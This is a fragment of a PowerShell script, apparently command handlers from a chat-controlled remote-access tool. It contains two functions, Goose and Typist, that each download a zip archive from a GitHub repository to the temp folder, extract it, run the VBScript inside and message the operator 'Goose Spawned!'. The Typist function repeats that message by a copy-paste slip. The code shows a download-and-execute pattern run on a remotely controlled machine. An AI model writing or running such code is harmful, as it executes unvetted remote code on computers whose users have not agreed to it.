...
- **Typist**: Drop typed keys down screen (Sam Pearson App)
...
Function Goose {
    $url = "https://github.com/ac1ddr1p/DC2/raw/main/DesktopGoose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "DesktopGoose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "DesktopGoose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\DesktopGoose.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}

Function Typist{
    $url = "https://github.com/ac1ddr1p/DC2/raw/main/GravityTypist.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "GravityTypist.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "GravityTypist"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\GravityTypist.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}
